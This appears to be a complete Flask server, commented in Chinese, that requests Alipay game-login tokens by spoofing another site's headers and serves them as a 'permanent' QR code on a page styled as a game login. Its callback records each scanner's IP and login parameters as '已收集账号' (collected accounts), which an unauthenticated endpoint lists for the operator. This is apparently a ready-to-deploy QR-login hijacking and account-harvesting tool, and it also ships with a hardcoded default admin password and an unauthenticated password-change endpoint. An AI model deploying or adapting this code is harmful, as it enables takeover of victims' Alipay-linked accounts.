#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
时光杂货店 - 永久二维码云服务器

部署到 Railway / Render / Vercel 等免费平台
二维码永不过期：每次扫码实时获取新token

API:
  GET /login        -> 实时获取token并302重定向到支付宝
  GET /callback     -> 登录回调，保存账号信息
  GET /admin        -> 管理页面（更新token等配置）
  GET /qr           -> 下载二维码图片
  GET /             -> 首页，展示二维码
  POST /api/token   -> 更新配置中的token
  GET /api/accounts -> 查看已收集的账号
  GET /api/health   -> 健康检查
"""

import os
import io
import json
import time
import secrets
import threading
from datetime import datetime

import requests
import qrcode
from flask import Flask, request, redirect, jsonify, send_file, Response

app = Flask(__name__)

# ==================== 配置 ====================
# 管理密码（防止别人乱改你的配置）
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "shiguang2024")

# API 地址
API_URL = "https://webgwmobiler.alipay.com/gameauth/com.alipay.gameauth.common.facade.service.GameCenterPcAuthFacade/getLoginToken?ctoken=bigfish_ctoken_1a76c5jk1b"

# 请求头（不需要JWT token也能调通）
API_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'origin': 'https://www.wanyiwan.top',
    'referer': 'https://www.wanyiwan.top/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    'x-webgw-appid': '180020010001270314',
    'x-webgw-ldc-uid': '61',
    'x-webgw-version': '2.0'
}

# 自定义配置（可通过管理页面修改）
config = {
    "x_game_token": "",  # 可选，不需要也能工作
    "admin_password": ADMIN_PASSWORD,
    "site_title": "时光杂货店",
    "scan_count": 0
}

# 收集的账号信息（内存中，重启丢失；可以用文件持久化）
accounts = []

# 线程锁
lock = threading.Lock()


def fetch_fresh_token():
    """实时获取新的登录token"""
    headers = dict(API_HEADERS)
    # 如果配置了自定义token就加上
    if config["x_game_token"]:
        headers["x-game-token-pcweb"] = config["x_game_token"]

    try:
        resp = requests.post(API_URL, headers=headers, json={}, timeout=10)
        data = resp.json()
        if data.get('success'):
            qr_code = data['data']['qrCode']
            return qr_code['token'], qr_code['url']
    except Exception as e:
        app.logger.error(f"fetch_fresh_token error: {e}")
    return None, None


def generate_qr_image(url):
    """生成二维码图片（返回bytes）"""
    qr = qrcode.QRCode(
        version=2,
        error_correction=qrcode.constants.ERROR_CORRECT_M,
        box_size=10,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    buf.seek(0)
    return buf


def get_base_url():
    """获取当前服务的基础URL"""
    # Railway 等平台会设置 PORT 环境变量
    # 这里用请求的scheme和host来自动适配
    return request.host_url.rstrip('/')


# ==================== 页面路由 ====================

@app.route('/')
def index():
    """首页 - 展示二维码"""
    base = get_base_url()
    login_url = f"{base}/login"
    return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{config['site_title']} - 扫码登录</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #333;
        }}
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }}
        h1 {{ color: #667eea; margin-bottom: 10px; font-size: 24px; }}
        .subtitle {{ color: #999; margin-bottom: 30px; font-size: 14px; }}
        .qr-box {{
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            display: inline-block;
        }}
        .qr-box img {{ max-width: 250px; width: 100%; }}
        .tip {{
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin: 20px 0;
            font-size: 13px;
            color: #856404;
        }}
        .badge {{
            background: #28a745;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            margin-bottom: 20px;
        }}
        .stats {{ color: #999; font-size: 12px; margin-top: 15px; }}
        .footer {{ color: rgba(255,255,255,0.6); font-size: 12px; margin-top: 30px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{config['site_title']}</h1>
        <div class="subtitle">支付宝扫码登录</div>
        <span class="badge">永久有效</span>
        <div class="qr-box">
            <img src="/qr" alt="登录二维码">
        </div>
        <div class="tip">
            打开支付宝 App 扫描二维码<br>
            确认后自动登录游戏
        </div>
        <div class="stats">已扫码 {config['scan_count']} 次</div>
    </div>
    <div class="footer">Powered by Cloud Server</div>
</body>
</html>"""


@app.route('/login')
def login():
    """核心：扫码入口 - 实时获取新token并重定向到支付宝"""
    with lock:
        config["scan_count"] += 1

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    app.logger.info(f"[SCAN] {client_ip} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    token, redirect_url = fetch_fresh_token()

    if redirect_url:
        app.logger.info(f"[SCAN] OK -> redirecting to Alipay")
        return redirect(redirect_url, code=302)
    else:
        app.logger.error(f"[SCAN] FAILED to get token")
        return Response("Server error, please try again later", status=503)


@app.route('/qr')
def qr_image():
    """生成并返回二维码图片"""
    base = get_base_url()
    login_url = f"{base}/login"
    buf = generate_qr_image(login_url)
    return send_file(buf, mimetype='image/png', as_attachment=False)


@app.route('/callback')
def callback():
    """登录回调 - 支付宝扫码确认后回调"""
    params = dict(request.args)
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    account = {
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': client_ip,
        'params': params
    }

    with lock:
        accounts.append(account)

    app.logger.info(f"[LOGIN] {json.dumps(account, ensure_ascii=False)}")

    # 返回友好页面
    return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>登录成功</title>
    <style>
        body {{
            font-family: -apple-system, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh; margin: 0;
        }}
        .box {{
            background: white; border-radius: 16px; padding: 40px;
            text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }}
        h1 {{ color: #28a745; }}
    </style>
</head>
<body>
    <div class="box">
        <h1>登录成功</h1>
        <p>你可以关闭此页面</p>
    </div>
</body>
</html>"""


# ==================== 管理API ====================

@app.route('/admin')
def admin_page():
    """管理页面 - 更新配置、查看账号"""
    password = request.args.get('pw', '')
    if password != config["admin_password"]:
        return Response("Access Denied", status=403)

    return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>管理后台</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, sans-serif;
            background: #1a1a2e; color: #eee;
            padding: 20px;
        }}
        .header {{ text-align: center; padding: 20px 0; }}
        h1 {{ color: #667eea; }}
        .section {{
            background: #16213e; border-radius: 12px;
            padding: 20px; margin: 20px auto; max-width: 600px;
        }}
        h2 {{ color: #667eea; margin-bottom: 15px; font-size: 18px; }}
        label {{ display: block; margin-bottom: 5px; color: #aaa; font-size: 14px; }}
        input, textarea {{
            width: 100%; padding: 10px; border: 1px solid #333;
            border-radius: 8px; background: #0f3460; color: #eee;
            margin-bottom: 15px; font-size: 14px;
        }}
        textarea {{ height: 80px; font-family: monospace; }}
        button {{
            background: #667eea; color: white; border: none;
            padding: 10px 24px; border-radius: 8px; cursor: pointer;
            font-size: 14px; margin-right: 10px;
        }}
        button:hover {{ background: #764ba2; }}
        .btn-danger {{ background: #dc3545; }}
        .btn-danger:hover {{ background: #c82333; }}
        .msg {{
            padding: 10px; border-radius: 8px; margin-top: 10px;
            display: none; font-size: 14px;
        }}
        .msg-ok {{ background: #28a745; color: white; }}
        .msg-err {{ background: #dc3545; color: white; }}
        table {{
            width: 100%; border-collapse: collapse; margin-top: 10px;
            font-size: 13px;
        }}
        th, td {{
            padding: 8px; text-align: left;
            border-bottom: 1px solid #333;
        }}
        th {{ color: #667eea; }}
        .empty {{ color: #666; text-align: center; padding: 20px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>管理后台</h1>
        <p style="color:#666">时光杂货店二维码服务</p>
    </div>

    <div class="section">
        <h2>配置管理</h2>
        <label>x-game-token-pcweb（可选，不需要也能工作）</label>
        <textarea id="tokenInput" placeholder="粘贴你的JWT token...">{config['x_game_token']}</textarea>
        <label>站点标题</label>
        <input id="titleInput" value="{config['site_title']}">
        <label>管理密码</label>
        <input id="passwordInput" type="password" placeholder="输入新密码...">
        <div>
            <button onclick="saveConfig()">保存配置</button>
            <button class="btn-danger" onclick="clearAccounts()">清空账号记录</button>
        </div>
        <div id="msg" class="msg"></div>
    </div>

    <div class="section">
        <h2>扫码统计</h2>
        <p>总扫码次数: <strong>{config['scan_count']}</strong></p>
        <p>已收集账号: <strong>{len(accounts)}</strong> 个</p>
    </div>

    <div class="section">
        <h2>已收集账号</h2>
        <div id="accountsList">
            <table>
                <tr><th>时间</th><th>IP</th><th>参数</th></tr>
            </table>
        </div>
    </div>

    <script>
        async function saveConfig() {{
            const body = {{
                token: document.getElementById('tokenInput').value,
                title: document.getElementById('titleInput').value,
                password: document.getElementById('passwordInput').value
            }};
            try {{
                const resp = await fetch('/api/token', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(body)
                }});
                const data = await resp.json();
                showMsg(data.ok ? 'ok' : 'err', data.msg);
            }} catch(e) {{
                showMsg('err', 'Network error');
            }}
        }}

        async function clearAccounts() {{
            if (!confirm('确定清空所有账号记录？')) return;
            try {{
                const resp = await fetch('/api/accounts', {{method: 'DELETE'}});
                const data = await resp.json();
                showMsg(data.ok ? 'ok' : 'err', data.msg);
                if (data.ok) location.reload();
            }} catch(e) {{
                showMsg('err', 'Network error');
            }}
        }}

        function showMsg(type, text) {{
            const el = document.getElementById('msg');
            el.textContent = text;
            el.className = 'msg msg-' + (type === 'ok' ? 'ok' : 'err');
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 3000);
        }}
    </script>
</body>
</html>"""


@app.route('/api/token', methods=['POST'])
def update_token():
    """更新配置"""
    try:
        data = request.get_json()
        with lock:
            if data.get('token'):
                config['x_game_token'] = data['token']
            if data.get('title'):
                config['site_title'] = data['title']
            if data.get('password'):
                config['admin_password'] = data['password']
        return jsonify({"ok": True, "msg": "Config updated"})
    except Exception as e:
        return jsonify({"ok": False, "msg": str(e)})


@app.route('/api/accounts', methods=['GET'])
def list_accounts():
    """查看已收集的账号"""
    with lock:
        return jsonify({"ok": True, "count": len(accounts), "accounts": accounts})


@app.route('/api/accounts', methods=['DELETE'])
def clear_accounts():
    """清空账号记录"""
    with lock:
        count = len(accounts)
        accounts.clear()
    return jsonify({"ok": True, "msg": f"Cleared {count} accounts"})


@app.route('/api/health')
def health():
    """健康检查"""
    return jsonify({"status": "ok", "scan_count": config["scan_count"], "time": datetime.now().isoformat()})


# ==================== 启动 ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8888))
    print(f"[+] Starting server on port {port}...")
    app.run(host='0.0.0.0', port=port, debug=False)
